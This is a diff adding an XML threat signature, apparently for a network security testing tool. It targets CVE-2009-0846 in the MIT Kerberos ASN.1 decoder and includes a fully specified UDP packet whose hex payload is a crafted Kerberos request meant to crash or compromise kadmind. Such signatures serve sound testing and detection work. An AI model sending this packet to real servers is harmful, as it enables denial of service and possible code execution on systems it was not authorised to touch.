@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="MIT Kerberos ASN.1 asn1_decode_generaltime Uninitialized Pointer Reference"/>
+    <EngDesc display="true" value="A memory corruption vulnerability exists in MIT Kerberos server. The vulnerability is due to the release of an uninitialized pointer in the ASN.1 decoder while decoding maliciously crafted data. A remote, unauthenticated attacker can exploit this vulnerability by sending a specially crafted RPC request to the kadmind daemon. In an attack aiming for denial of service, the Kerberos kadmind service will terminate abnormally as a result of an attack. The Kerberos administration functionality remains unavailable until the service is restarted. In a more sophisticated attack scenario, where the malicious user is successful in injecting and executing supplied code, the behaviour of the system is dependent on the nature the injected code. Any code injected into the vulnerable component would execute in the security context of the service process, which may be system/root level."/>
+    <Intent display="true">
+      <item value="Code_Execution/Memory_Corruption"/>
+    </Intent>
+    <Protocol display="true" value="Kerberos ASN.1"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="MIT"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="MIT_Kerberos_server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="MIT_Kerberos_prior_to_krb5-1.6.4"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-0846"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="bdac3b74ce20b1aa6e1f3c38127fd97f"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633983878543293362"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1262773825" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="B"/>
+    <NamedVar name="sourcePort" type="ImperfectControls.Port" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="B"/>
+      <for index="E"/>
+      <for index="C"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00CA" Identification="5289" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="$sourcePort" destPort="$destPort" checksum="" length="00B6" Payload="6A81AB3081A8A103020105A20302010AA4819B308160A00703050040000010A111300FA003020101A10830061B04726F6F74A20F1B0D5652542E54454C55532E434F4DA3223020A003020100A11930171B066B72627467741B0D5652542E54454C55532E434F4DA411180F32303039303430383137353533365AA511180F32303039303331313231353731375AA706020548DCE518A8173015020112020111020110020117020101020103020102"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
